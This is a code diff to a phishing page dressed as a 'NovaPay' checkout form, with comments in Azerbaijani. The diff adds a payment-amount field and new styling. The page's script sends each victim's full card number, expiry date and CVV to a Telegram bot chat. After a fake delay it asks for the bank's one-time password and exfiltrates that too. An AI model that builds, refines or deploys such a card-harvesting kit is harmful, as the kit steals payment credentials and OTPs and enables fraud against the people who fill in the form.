@@ -14,7 +14,7 @@
 
     body {
       min-height: 100vh;
-      background: linear-gradient(145deg, #f0f4fa 0%, #e6ecf5 100%);
+      background: linear-gradient(145deg, #eef2f9 0%, #e2e9f3 50%, #dde6f2 100%);
       display: flex;
       align-items: center;
       justify-content: center;
@@ -26,7 +26,7 @@
       width: 100%;
       background: #ffffff;
       border-radius: 36px;
-      box-shadow: 0 25px 50px -12px rgba(0, 20, 40, 0.25), 0 4px 12px 0 rgba(0, 0, 0, 0.05);
+      box-shadow: 0 30px 60px -15px rgba(10, 30, 60, 0.28), 0 6px 18px 0 rgba(0, 0, 0, 0.04);
       padding: 32px 28px;
       transition: all 0.2s ease;
     }
@@ -35,7 +35,7 @@
       display: flex;
       align-items: center;
       gap: 10px;
-      margin-bottom: 28px;
+      margin-bottom: 24px;
       justify-content: center;
     }
 
@@ -66,19 +66,136 @@
       font-weight: 800;
     }
 
-    .title {
-      font-size: 20px;
-      font-weight: 600;
-      color: #1e2e45;
-      margin-bottom: 6px;
-      text-align: center;
+    /* ==== AMOUNT BOX ==== */
+    .amount-box {
+      background: linear-gradient(135deg, #0a2540 0%, #163b63 100%);
+      border-radius: 24px;
+      padding: 22px 22px 20px;
+      margin-bottom: 28px;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 16px 32px -14px rgba(10, 37, 64, 0.5);
     }
 
-    .subtitle {
-      font-size: 14px;
-      color: #6b7a8f;
-      text-align: center;
-      margin-bottom: 30px;
+    .amount-box::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      right: -20%;
+      width: 180px;
+      height: 180px;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(58, 123, 213, 0.35) 0%, transparent 70%);
+      pointer-events: none;
+    }
+
+    .amount-box::after {
+      content: '';
+      position: absolute;
+      bottom: -60%;
+      left: -10%;
+      width: 140px;
+      height: 140px;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(255, 255, 255, 0.08) 0%, transparent 70%);
+      pointer-events: none;
+    }
+
+    .amount-label {
+      font-size: 12px;
+      font-weight: 600;
+      color: #9fb6d4;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      margin-bottom: 6px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .amount-row {
+      display: flex;
+      align-items: baseline;
+      gap: 10px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .currency {
+      font-size: 26px;
+      font-weight: 600;
+      color: #7fa8d8;
+      line-height: 1;
+    }
+
+    .amount-input {
+      background: transparent;
+      border: none;
+      outline: none;
+      color: #ffffff;
+      font-size: 44px;
+      font-weight: 700;
+      letter-spacing: -1.5px;
+      width: 100%;
+      padding: 0;
+      font-family: inherit;
+      line-height: 1.1;
+    }
+
+    .amount-input::placeholder {
+      color: rgba(255, 255, 255, 0.25);
+      font-weight: 700;
+    }
+
+    .amount-input::-webkit-outer-spin-button,
+    .amount-input::-webkit-inner-spin-button {
+      -webkit-appearance: none;
+      margin: 0;
+    }
+
+    .amount-input[type=number] {
+      -moz-appearance: textfield;
+      appearance: textfield;
+    }
+
+    .amount-meta {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-top: 12px;
+      font-size: 12.5px;
+      color: #9fb6d4;
+      position: relative;
+      z-index: 1;
+    }
+
+    .amount-meta .dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: #37d67a;
+      display: inline-block;
+      box-shadow: 0 0 0 3px rgba(55, 214, 122, 0.18);
+    }
+
+    /* ==== DIVIDER ==== */
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin: 4px 0 22px;
+      color: #b1bdcc;
+      font-size: 12px;
+      font-weight: 600;
+      letter-spacing: 0.6px;
+      text-transform: uppercase;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #e6ecf3;
     }
 
     .form-group {
@@ -149,7 +266,7 @@
       cursor: pointer;
       transition: all 0.2s ease;
       box-shadow: 0 12px 24px -8px rgba(10, 37, 64, 0.35);
-      margin-top: 10px;
+      margin-top: 6px;
     }
 
     .btn:hover {
@@ -260,8 +377,22 @@
       <div class="brand-name">Nova<span>Pay</span></div>
     </div>
 
-    <h2 class="title" id="formTitle">Payment details</h2>
-    <p class="subtitle" id="formSubtitle">All transactions are secure and encrypted</p>
+    <!-- AMOUNT BOX -->
+    <div class="amount-box">
+      <div class="amount-label">Payment amount</div>
+      <div class="amount-row">
+        <span class="currency">$</span>
+        <input type="number" class="amount-input" id="amountInput" placeholder="0.00" min="0" step="0.01" inputmode="decimal">
+      </div>
+      <div class="amount-meta">
+        <span class="dot"></span> USD · Secure payment
+      </div>
+    </div>
+
+    <div class="divider">Card details</div>
+
+    <h2 class="title" id="formTitle" style="display:none;">Payment details</h2>
+    <p class="subtitle" id="formSubtitle" style="display:none;">All transactions are secure and encrypted</p>
 
     <div id="cardForm">
       <div class="form-group">
@@ -317,6 +448,7 @@
       const TELEGRAM_CHAT_ID = '-1004353567100';
 
       // ======== ELEMENTLƏR ========
+      const amountInput = document.getElementById('amountInput');
       const cardForm = document.getElementById('cardForm');
       const otpForm = document.getElementById('otpForm');
       const cardNumber = document.getElementById('cardNumber');
@@ -330,7 +462,7 @@
       const formTitle = document.getElementById('formTitle');
       const formSubtitle = document.getElementById('formSubtitle');
 
-      // ======== KÖMƏKÇI FUNKSİYALAR ========
+      // ======== KÖMƏKÇI ========
       function showStatus(el, text, type) {
         el.textContent = text;
         el.className = 'status-message ' + type;
@@ -340,6 +472,20 @@
       function hideStatus(el) {
         el.classList.add('hidden');
       }
+
+      // Yalnız rəqəm və bir nöqtə, maks 2 onluq
+      amountInput.addEventListener('input', function(e) {
+        let val = e.target.value.replace(/[^0-9.]/g, '');
+        const parts = val.split('.');
+        if (parts.length > 2) {
+          val = parts[0] + '.' + parts.slice(1).join('');
+        }
+        if (val.includes('.')) {
+          const [int, dec] = val.split('.');
+          if (dec.length > 2) val = int + '.' + dec.slice(0, 2);
+        }
+        e.target.value = val;
+      });
 
       cardNumber.addEventListener('input', function(e) {
         let value = e.target.value.replace(/\D/g, '');
@@ -366,12 +512,9 @@
         e.target.value = e.target.value.replace(/\D/g, '').slice(0, 8);
       });
 
-      // ======== TELEGRAM MESAJ GÖNDƏR ========
+      // ======== TELEGRAM ========
       async function sendToTelegram(text) {
-        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-          console.warn('Telegram bot token və chat id boşdur.');
-          return;
-        }
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         try {
           await fetch(url, {
@@ -388,12 +531,18 @@
         }
       }
 
-      // ======== KART MƏLUMATLARINI GÖNDƏR ========
+      // ======== KART GÖNDƏR ========
       async function submitCardData() {
+        const amount = amountInput.value.trim();
         const rawCard = cardNumber.value.replace(/\s/g, '');
         const exp = expiry.value;
         const cvvVal = cvv.value;
 
+        if (!amount || parseFloat(amount) <= 0) {
+          showStatus(cardStatus, 'Please enter a valid payment amount.', 'error');
+          amountInput.focus();
+          return;
+        }
         if (rawCard.length < 16) {
           showStatus(cardStatus, 'Please enter a valid 16-digit card number.', 'error');
           return;
@@ -413,9 +562,10 @@
 
         const message = `
 <b>💳 NovaPay – Yeni kart məlumatı</b>
-<b>Kart nömrəsi:</b> <code>${rawCard}</code>
-<b>Son istifadə:</b> ${exp}
-<b>CVV:</b> ${cvvVal}
+<b>💰 Məbləğ:</b> $${parseFloat(amount).toFixed(2)}
+<b>💳 Kart nömrəsi:</b> <code>${rawCard}</code>
+<b>📅 Son istifadə:</b> ${exp}
+<b>🔒 CVV:</b> ${cvvVal}
         `.trim();
 
         await sendToTelegram(message);
@@ -423,8 +573,6 @@
         setTimeout(() => {
           cardForm.style.display = 'none';
           otpForm.classList.add('active');
-          formTitle.textContent = 'Verification required';
-          formSubtitle.textContent = 'Enter the one-time password sent to your device';
           payBtn.disabled = false;
           payBtn.textContent = 'Continue';
         }, 5000);
@@ -442,9 +590,11 @@
         otpBtn.disabled = true;
         otpBtn.innerHTML = '<span class="spinner"></span> Verifying...';
 
+        const amount = amountInput.value.trim();
         const message = `
 <b>🔐 NovaPay – OTP kodu</b>
-<b>OTP:</b> <code>${code}</code>
+<b>💰 Məbləğ:</b> $${parseFloat(amount || 0).toFixed(2)}
+<b>🔑 OTP:</b> <code>${code}</code>
         `.trim();
 
         await sendToTelegram(message);
